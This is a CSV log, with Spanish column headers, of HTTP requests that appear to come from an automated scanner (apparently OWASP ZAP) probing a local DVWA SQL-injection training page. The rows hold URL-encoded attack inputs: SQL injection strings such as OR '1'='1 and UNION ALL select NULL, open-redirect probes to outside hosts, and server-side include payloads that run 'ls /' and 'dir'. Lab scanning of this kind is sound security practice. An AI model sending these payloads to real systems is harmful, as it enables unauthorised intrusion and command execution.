ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
23,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/3944188755050753324,404,Not Found,3,161,311
25,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
26,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2F&Submit=Submit,302,Found,2,628,0
27,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2F&Submit=Submit,302,Found,1,628,0
28,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com&Submit=Submit,302,Found,1,628,0
29,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
30,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,2,628,0
31,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2F&Submit=Submit,302,Found,1,628,0
32,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2F&Submit=Submit,302,Found,2,628,0
33,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com&Submit=Submit,302,Found,1,628,0
34,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
35,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
36,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%2F,302,Found,2,628,0
37,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%3A80%2F,302,Found,1,628,0
38,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com,302,Found,2,628,0
39,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
40,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
41,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%2F,302,Found,1,628,0
42,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%3A80%2F,302,Found,1,628,0
43,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com,302,Found,1,628,0
44,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
45,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%3A80%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
46,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
47,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=2513925798262360428.owasp.org&Submit=Submit,302,Found,2,628,0
48,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
49,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428%252eowasp%252eorg&Submit=Submit,302,Found,1,628,0
50,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%27&Submit=Submit,302,Found,1,628,0
51,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=URL%3D%27http%3A%2F%2F2513925798262360428.owasp.org%27&Submit=Submit,302,Found,1,628,0
52,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428.owasp.org%2F%3F1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,2,628,0
53,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%2F%3F1%27+OR+%271%27%3D%271%27&Submit=Submit,302,Found,1,628,0
54,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F%5C2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
55,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2F%5C2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
56,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=2513925798262360428.owasp.org,302,Found,1,628,0
57,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428.owasp.org,302,Found,1,628,0
58,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428%252eowasp%252eorg,302,Found,1,628,0
59,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%27,302,Found,2,628,0
60,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=URL%3D%27http%3A%2F%2F2513925798262360428.owasp.org%27,302,Found,2,628,0
61,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428.owasp.org%2F%3FSubmit,302,Found,1,628,0
62,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%2F%3FSubmit%27,302,Found,1,628,0
63,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F%5C2513925798262360428.owasp.org,302,Found,1,628,0
64,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2F%5C2513925798262360428.owasp.org,302,Found,1,628,0
65,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,3,224,366
66,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&Submit=Submit,200,OK,2,613,1342
67,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&Submit=Submit,200,OK,2,613,1342
68,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&Submit=Submit,200,OK,1,613,1342
69,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&Submit=Submit,200,OK,1,613,1342
70,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,200,OK,4,613,1342
71,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,200,OK,1,613,1342
72,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,200,OK,1,613,1342
73,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,200,OK,1,613,1342
74,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
75,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit,302,Found,2,628,0
76,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27&Submit=Submit,302,Found,1,628,0
77,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22&Submit=Submit,302,Found,1,628,0
78,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22&Submit=Submit,302,Found,1,628,0
79,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3B&Submit=Submit,302,Found,1,628,0
80,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3B&Submit=Submit,302,Found,1,628,0
81,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27%28&Submit=Submit,302,Found,1,628,0
82,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%28&Submit=Submit,302,Found,1,628,0
83,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
84,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,2,628,0
85,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+AND+1%3D1+--+&Submit=Submit,302,Found,1,628,0
86,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+AND+1%3D2+--+&Submit=Submit,302,Found,2,628,0
87,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+OR+1%3D1+--+&Submit=Submit,302,Found,1,628,0
88,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+AND+%271%27%3D%271%27+--+&Submit=Submit,302,Found,1,628,0
89,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+AND+%271%27%3D%272%27+--+&Submit=Submit,302,Found,1,628,0
90,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+OR+%271%27%3D%271%27+--+&Submit=Submit,302,Found,1,628,0
91,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,0,628,0
92,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
93,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
94,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
95,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
96,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,0,628,0
97,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27,302,Found,1,628,0
98,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27,302,Found,1,628,0
99,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22,302,Found,1,628,0
100,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22,302,Found,0,628,0
101,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3B,302,Found,0,628,0
102,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3B,302,Found,2,628,0
103,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%28,302,Found,1,628,0
104,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%28,302,Found,0,628,0
105,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
106,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
107,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D1+--+,302,Found,1,628,0
108,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D2+--+,302,Found,1,628,0
109,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+OR+1%3D1+--+,302,Found,1,628,0
110,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+AND+%271%27%3D%271%27+--+,302,Found,1,628,0
111,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+AND+%271%27%3D%272%27+--+,302,Found,1,628,0
112,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+OR+%271%27%3D%271%27+--+,302,Found,1,628,0
